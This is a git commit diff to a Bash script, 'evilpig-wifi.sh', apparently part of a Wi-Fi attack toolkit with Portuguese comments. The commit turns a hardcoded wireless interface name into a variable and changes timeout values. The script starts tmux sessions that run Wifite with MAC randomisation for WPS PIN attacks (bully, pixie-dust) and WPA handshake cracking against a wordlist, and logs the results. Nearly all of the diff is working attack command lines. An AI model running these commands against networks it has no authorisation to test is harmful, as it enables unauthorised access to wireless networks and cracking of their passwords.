50e3b6baaeda4906144cd486ba5788dcb082fc96
Pasch0 <pasch0.s3c@gmail.com>
2024-11-25 22:50:50 -0300

    Bug-fix no processo de instalação - part2

--- evilpig-wifi.sh
+++ evilpig-wifi.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
 
+INTERFACE="wlx0036765525cc"
+
 # Função para iniciar a sessão do tmux
 start_session() {
     # Verifica o parâmetro e executa os comandos apropriados
@@ -14,7 +16,7 @@ start_session() {
             tmux send-keys -t $SESSION_NAME "cd /opt/EvilPiG/wifite3" C-m
 
             # Apenas ataque WPS
-            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i wlx0036765525cc --random-mac -v --bully --pixie --wps-only --wps --wps-time 60 --wps-timeouts 30 --wps-fails 30 -p 30 > /opt/EvilPiG/wifite3/wifite.log && exit" C-m
+            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i $INTERFACE --random-mac -v --bully --pixie --wps-only --wps --wps-time 60 --wps-timeouts 30 --wps-fails 30 -p 30 > /opt/EvilPiG/wifite3/wifite.log && exit" C-m
             ;;
         2)
             # Nome da sessão
@@ -26,7 +28,7 @@ start_session() {
             tmux send-keys -t $SESSION_NAME "cd /opt/EvilPiG/wifite3" C-m
 
             # Apenas ataque WPA
-            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i wlx0036765525cc --random-mac --no-wps --clients-only -v --dict /opt/EvilPiG/wifite3/wordlist-top4800-probable.txt --wpat 60 --wpadt 7 -p 20 > /opt/EvilPiG/wifite3/wifite.log && exit" C-m
+            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i $INTERFACE --random-mac --no-wps --clients-only -v --dict /opt/EvilPiG/wifite3/wordlist-top4800-probable.txt --wpat 60 --wpadt 7 -p 30 > /opt/EvilPiG/wifite3/wifite.log && exit" C-m
             ;;
         3)
             # Nome da sessão
@@ -38,7 +40,7 @@ start_session() {
             tmux send-keys -t $SESSION_NAME "cd /opt/EvilPiG/wifite3" C-m
 
             # Ataques WPS e WPA
-            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i wlx0036765525cc --random-mac -v --bully --pixie --wps-only --wps --wps-time 60 --wps-timeouts 5 --wps-fails 5 -p 20 > /opt/EvilPiG/wifite3/wifite.log && python3 Wifite.py -i wlx0036765525cc --random-mac --no-wps --clients-only -v --dict /opt/EvilPiG/wifite3/wordlist-top4800-probable.txt --wpat 60 --wpadt 7 -p 20 >> /opt/EvilPiG/wifite3/wifite.log && exit" C-m
+            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i $INTERFACE --random-mac -v --bully --pixie --wps-only --wps --wps-time 60 --wps-timeouts 30 --wps-fails 30 -p 30 > /opt/EvilPiG/wifite3/wifite.log && python3 Wifite.py -i $INTERFACE --random-mac --no-wps --clients-only -v --dict /opt/EvilPiG/wifite3/wordlist-top4800-probable.txt --wpat 60 --wpadt 7 -p 30 >> /opt/EvilPiG/wifite3/wifite.log && exit" C-m
             ;;
         *)
             echo "Parâmetro inválido. Use 1 para WPS, 2 para WPA ou 3 para ambos."
